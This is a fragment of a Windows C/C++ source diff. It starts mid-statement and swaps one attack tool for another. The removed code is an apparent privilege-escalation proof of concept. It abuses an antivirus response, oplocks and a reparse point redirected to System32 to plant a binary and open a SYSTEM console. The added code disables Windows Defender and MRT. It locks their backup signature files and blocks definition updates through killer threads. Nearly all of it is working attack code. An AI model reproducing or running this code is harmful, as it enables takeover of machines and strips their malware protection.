+			FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT, NULL, NULL);
 
-    res = SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
-    if (!res)
-    {
-        CloseHandle(hnewtoken);
-        return;
-    }
+	} while (stat == STATUS_OBJECT_NAME_NOT_FOUND);
+	if (stat || !hmonitordir)
+	{
+		printf("Failed to open MRT directory, error : 0x%0.8X\n",stat);
+		return 1;
+	}
+	char notifydata[0x1000] = { 0 };
+	do {
 
-    STARTUPINFO si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-    CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+		if (!ReadDirectoryChangesW(hmonitordir, notifydata, sizeof(notifydata), TRUE, FILE_NOTIFY_CHANGE_SIZE, &retbytes, NULL, NULL))
+		{
 
-    CloseHandle(hnewtoken);
+			printf("Failed to set directory watcher.\n");
+			return 1;
+		}
 
-    if (pi.hProcess)
-        CloseHandle(pi.hProcess);
-    if (pi.hThread)
-        CloseHandle(pi.hThread);
-    return;
 
+		FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)notifydata;
+		if (fni->Action != FILE_ACTION_MODIFIED)
+			continue;
+
+		//printf("Notify triggered.\n");
+
+		UpdThreadObj* threadargv = new UpdThreadObj;
+		threadargv->wdupdatedir = &_wdupdatedir[4];
+		fni->FileName[fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)] = NULL;
+		wchar_t* target = (wchar_t*)malloc(fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t));
+		ZeroMemory(target, sizeof(fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)));
+		wcscpy(target, fni->FileName);
+		threadargv->target = target;
+		DWORD tid = 0;
+		// TODO : track thread creation
+		HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)UpdateBlockerThread, threadargv, NULL, &tid);
+
+	} while (1);
+	return ERROR_SUCCESS;
 }
 
-bool IsRunningAsLocalSystem()
+int wmain()
 {
-
-    HANDLE htoken = NULL;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
-        printf("OpenProcessToken failed, error : %d\n", GetLastError());
-        return false;
-    }
-    TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
-    DWORD retsz = 0;
-    bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
-    CloseHandle(htoken);
-    if (!res)
-        return false;
-    bool ret = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
-    if (ret) {
-        LaunchConsoleInSessionId();
-        ExitProcess(0);
-    }
-    return ret;
-}
-bool r = IsRunningAsLocalSystem();
-
-void LaunchTierManagementEng()
-{
-    CoInitialize(NULL);
-    GUID guidObject = { 0x50d185b9,0xfff3,0x4656,{0x92,0xc7,0xe4,0x01,0x8d,0xa4,0x36,0x1d} };
-    void* ret = NULL;
-    HRESULT hr = CoCreateInstance(guidObject, NULL, CLSCTX_LOCAL_SERVER, guidObject, &ret);
-    
-
-    CoUninitialize();
-}
-
-int main()
-{
-    HANDLE hpipe = CreateNamedPipe(L"\\??\\pipe\\REDSUN", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, NULL, 1, NULL, NULL, NULL,NULL);
-    if (hpipe == INVALID_HANDLE_VALUE)
-        return 1;
-
-    wchar_t workdir[MAX_PATH] = { 0 };
-    ExpandEnvironmentStrings(L"%TEMP%\\RS-", workdir, MAX_PATH);
-    
-    GUID uid = { 0 };
-    wchar_t wuid[100] = { 0 };
-    CoCreateGuid(&uid);
-    StringFromGUID2(uid, wuid, 100);
-    wcscat(workdir, wuid);
-    wchar_t filename[] = L"TieringEngineService.exe";
-    wchar_t foo[MAX_PATH];
-    wsprintf(foo, L"%ws\\%ws", workdir, filename);
-
-    DWORD tid = 0;
-    HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ShadowCopyFinderThread, foo, NULL, &tid);
-
-    if (!CreateDirectory(workdir, NULL))
-    {
-        printf("Failed to create workdir");
-        return 1;
-    }
-    HANDLE hfile = CreateFile(foo, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hfile == INVALID_HANDLE_VALUE)
-    {
-        printf("Failed create spoof work file.\n");
-        return 1;
-    }
-    std::string eicar = getEICAR();
-    DWORD nwf = 0;
-    WriteFile(hfile, eicar.c_str(), (DWORD)eicar.size(), &nwf, NULL);
-    
-    // trigger AV response
-    CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (WaitForSingleObject(gevent, 120000) != WAIT_OBJECT_0)
-    {
-        printf("PoC timed out, is real time protection enabled ?");
-        return 1;
-    }
-
-    IO_STATUS_BLOCK iostat = { 0 };
-    FILE_DISPOSITION_INFORMATION_EX fdiex = { 0x00000001 | 0x00000002 };
-    _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
-    CloseHandle(hfile);
-    DoCloudStuff(workdir, filename, (DWORD)eicar.size());
-    
-    OVERLAPPED ovd = { 0 };
-    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
-
-    SetEvent(gevent);
-
-    WaitOnAddress(&gevent, &gevent, sizeof(HANDLE), INFINITE);
-    
-    NTSTATUS stat;
-    wchar_t ntfoo[MAX_PATH] = { L"\\??\\" };
-    wcscat(ntfoo, foo);
-    UNICODE_STRING _foo = { 0 };
-    RtlInitUnicodeString(&_foo, ntfoo);
-    OBJECT_ATTRIBUTES _objattr = { 0 };
-    InitializeObjectAttributes(&_objattr, &_foo, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-    wchar_t _tmp[MAX_PATH] = { 0 };
-    wsprintf(_tmp, L"\\??\\%s.TMP", workdir);
-    MoveFileEx(workdir,_tmp,MOVEFILE_REPLACE_EXISTING);
-    if (!CreateDirectory(workdir, NULL))
-    {
-        printf("Failed to re-create directory.\n");
-        return 1;
-    }
-    LARGE_INTEGER fsz = { 0 };
-    fsz.QuadPart = 0x1000;
-    stat = NtCreateFile(&hfile, FILE_READ_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, &fsz, FILE_ATTRIBUTE_READONLY, FILE_SHARE_READ, FILE_SUPERSEDE, NULL, NULL, NULL);
-    if (stat)
-    {
-        printf("Failed to re-open spoof work file, error : 0x%0.8X\n", stat);
-        return 1;
-    }
-    DeviceIoControl(hfile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
-    if (GetLastError() != ERROR_IO_PENDING)
-    {
-        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
-        return 1;
-    }
-
-    HANDLE hmap = CreateFileMapping(hfile, NULL, PAGE_READONLY, NULL, NULL, NULL);
-    void* mappingaddr = MapViewOfFile(hmap, PAGE_READONLY, NULL, NULL, NULL);
-    
-    DWORD nbytes = 0;
-    GetOverlappedResult(hfile, &ovd, &nbytes, TRUE);
-    UnmapViewOfFile(mappingaddr);
-    CloseHandle(hmap);
-
-    
-    {
-        wchar_t _tmp[MAX_PATH] = { 0 };
-        wsprintf(_tmp, L"\\??\\%s.TEMP2", workdir);
-
-        PFILE_RENAME_INFORMATION pfri = (PFILE_RENAME_INFORMATION)malloc(sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
-        ZeroMemory(pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
-        pfri->ReplaceIfExists = TRUE;
-        pfri->FileNameLength = (sizeof(wchar_t) * wcslen(_tmp));
-        memmove(&pfri->FileName[0], _tmp, (sizeof(wchar_t) * wcslen(_tmp)));
-        stat = _NtSetInformationFile(hfile, &iostat, pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)), (FILE_INFORMATION_CLASS)10);
-        _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
-    }
-    wchar_t _rp[MAX_PATH] = { L"\\??\\" };
-    wcscat(_rp, workdir);
-    UNICODE_STRING _usrp = { 0 };
-    RtlInitUnicodeString(&_usrp, _rp);
-    InitializeObjectAttributes(&_objattr, &_usrp, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    HANDLE hrp = NULL;
-    stat = NtCreateFile(&hrp, FILE_WRITE_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
-    if (stat)
-    {
-        printf("Failed to re-open work directory.\n");
-        return 1;
-    }
-    
-
-    wchar_t rptarget[] = { L"\\??\\C:\\Windows\\System32" };
-    DWORD targetsz = wcslen(rptarget) * 2;
-    DWORD printnamesz = 1 * 2;
-    DWORD pathbuffersz = targetsz + printnamesz + 12;
-    DWORD totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
-    REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
-    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
-    rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
-    rdb->Reserved = NULL;
-    rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
-    rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
-    memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
-    rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
-    rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
-    memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, rptarget, printnamesz);
-    DWORD ret = DeviceIoControl(hrp, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, NULL);
-    HeapFree(GetProcessHeap(), NULL, rdb);
-
-    HANDLE hlk = NULL;
-    
-    HANDLE htimer = CreateWaitableTimer(NULL, FALSE, NULL);
-    LARGE_INTEGER duetime = { 0 };
-    GetSystemTimeAsFileTime((LPFILETIME)&duetime);
-    ULARGE_INTEGER _duetime = { duetime.LowPart, duetime.HighPart };
-    _duetime.QuadPart += 0x2FAF080;
-    duetime.QuadPart = _duetime.QuadPart;
-    CloseHandle(hfile);
-    for (int i = 0; i < 1000; i++)
-    {
-        wchar_t malpath[] = { L"\\??\\C:\\Windows\\System32\\TieringEngineService.exe" };
-        UNICODE_STRING _malpath = { 0 };
-        RtlInitUnicodeString(&_malpath, malpath);
-        OBJECT_ATTRIBUTES objattr2 = { 0 };
-        InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-        IO_STATUS_BLOCK iostat = { 0 };
-        stat = NtCreateFile(&hlk, GENERIC_WRITE, &objattr2, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SUPERSEDE, NULL, NULL, NULL);
-        if (!stat)
-            break;
-        Sleep(20);
-    }
+	DWORD tid2 = 0;
 
 
-    if (stat != STATUS_SUCCESS)
-    {
-        printf("Something went wrong.\n");
-        return 1;
-    }
-    printf("The red sun shall prevail.\n");
-    
-    CloseHandle(hlk);
-    CloseHandle(hrp);
-    
+	wchar_t updatedir[MAX_PATH] = { 0 };
+	HKEY wdkey = NULL;
+	wchar_t wdpath[MAX_PATH] = { 0 };
+	wchar_t wdupdatedir[MAX_PATH] = { 0 };
+	wchar_t _wdupdatedir[MAX_PATH] = { 0 };
+	DWORD retsz = sizeof(wdpath);
+	DWORD retbytes = 0;
+	DWORD retcode = 0;
+	HANDLE hmonitordir = NULL;
+	NTSTATUS stat = STATUS_SUCCESS;
+	UNICODE_STRING target = { 0 };
+	OBJECT_ATTRIBUTES objattr = { 0 };
+	IO_STATUS_BLOCK iostat = { 0 };
+	gHandleTrackerLock = new CRITICAL_SECTION;
+	InitializeCriticalSection(gHandleTrackerLock);
 
 
-    wchar_t mx[MAX_PATH] = { 0 };
-    GetModuleFileName(GetModuleHandle(NULL), mx, MAX_PATH);
-    wchar_t mx2[MAX_PATH] = { 0 };
-    ExpandEnvironmentStrings(L"%WINDIR%\\System32\\TieringEngineService.exe", mx2, MAX_PATH);
-    CopyFile(mx, mx2, FALSE);
-    LaunchTierManagementEng();
-    Sleep(2000);
-    CloseHandle(hpipe);
+	HANDLE wdkiller = NULL;
 
-    return 0;
+
+
+	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", NULL, KEY_READ, &wdkey) || !wdkey)
+	{
+		printf("Failed to open windows defender key.\n");
+		return 1;
+	}
+
+	//TODO : Check if this returns a properly null terminated string
+	retcode = RegQueryValueEx(wdkey, L"ProductAppDataPath", NULL, NULL, (LPBYTE)wdpath, &retsz);
+	RegCloseKey(wdkey);
+	wdkey = NULL;
+	if (retcode)
+	{
+		printf("Failed to find windows defender installation path.\n");
+		return 1;
+	}
+
+	wcscpy(wdupdatedir, wdpath);
+	wcscat(wdupdatedir, L"\\Definition Updates");
+
+	wcscpy(_wdupdatedir, L"\\??\\");
+	wcscat(_wdupdatedir, wdupdatedir);
+
+	wcscpy(gbackupfile1, _wdupdatedir);
+	wcscpy(gbackupfile2, _wdupdatedir);
+	wcscat(gbackupfile1, L"\\Backup\\mpavbase.lkg");
+	wcscat(gbackupfile2, L"\\Backup\\mpavbase.vdm");
+
+	TryLockBackup();
+
+	wdkiller = CreateThread(NULL, NULL, WDKillerThread, NULL, NULL, &tid2);
+
+	// run in killer mode
+	// WaitForSingleObject(wdkiller,INFINITE);
+	// 
+
+	HANDLE mrtkiller = CreateThread(NULL, NULL, MRTWorkerThread, NULL, NULL, &tid2);
+	if (!wdkiller)
+	{
+		printf("Failed to create defender killer thread.\n");
+	}
+	if (!mrtkiller)
+	{
+		printf("Failed to create MRT killer thread.\n");
+	}
+
+	RtlInitUnicodeString(&target, _wdupdatedir);
+	InitializeObjectAttributes(&objattr, &target, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+	stat = NtCreateFile(&hmonitordir, FILE_READ_DATA | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+		FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT, NULL, NULL);
+	if (stat || !hmonitordir)
+	{
+		printf("Failed to open windows defender update directory.\n");
+		return 1;
+	}
+
+	
+
+	//WaitForSingleObject(gevent, INFINITE);
+	char notifydata[0x1000] = { 0 };
+	do {
+
+		if (!ReadDirectoryChangesW(hmonitordir, notifydata, sizeof(notifydata), TRUE, FILE_NOTIFY_CHANGE_SIZE, &retbytes, NULL, NULL))
+		{
+
+			printf("Failed to set directory watcher.\n");
+			return 1;
+		}
+
+
+		FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)notifydata;
+		if (fni->Action != FILE_ACTION_MODIFIED)
+			continue;
+
+		//printf("Notify triggered.\n");
+		
+		UpdThreadObj* threadargv = new UpdThreadObj;
+		threadargv->wdupdatedir = wdupdatedir;
+		fni->FileName[fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)] = NULL;
+		wchar_t* target = (wchar_t*)malloc(fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t));
+		ZeroMemory(target, sizeof(fni->FileNameLength * sizeof(wchar_t) + sizeof(wchar_t)));
+		wcscpy(target, fni->FileName);
+		threadargv->target = target;
+		DWORD tid = 0;
+		// TODO : track thread creation
+		HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)UpdateBlockerThread, threadargv, NULL, &tid);
+
+
+	} while (1);
+
+
+	CloseHandle(hmonitordir);
+
+
+	return 0;
 }
